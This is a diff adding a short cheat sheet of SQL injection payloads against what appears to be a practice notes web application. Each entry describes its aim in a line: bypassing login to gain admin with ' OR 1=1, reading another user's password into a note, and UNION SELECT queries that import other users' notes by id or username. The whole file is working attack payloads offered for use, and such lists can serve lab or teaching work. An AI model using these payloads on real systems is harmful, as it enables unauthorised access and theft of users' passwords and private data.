@@ -1,0 +1,17 @@
+Chose any id number for your note:
+    message', 123); -- -
+
+Create a new note with someone elses password
+    '||(SELECT password FROM users WHERE username="bernardo")||'
+
+Bypass login (will give you admin)
+    ' OR 1=1 -- -
+
+Take any note from ID by importing.
+    0 UNION SELECT * FROM notes WHERE id=1-- -
+
+Take the first note from someone else by username by importing.
+    1 UNION SELECT * FROM notes WHERE assocUser=(SELECT id FROM users WHERE username='bernardo')-- -
+
+Take a specific note from someone else by importing.
+    1 UNION SELECT * FROM notes WHERE assocUser=(SELECT id FROM users WHERE username='bernardo') AND rownum = 2-- -
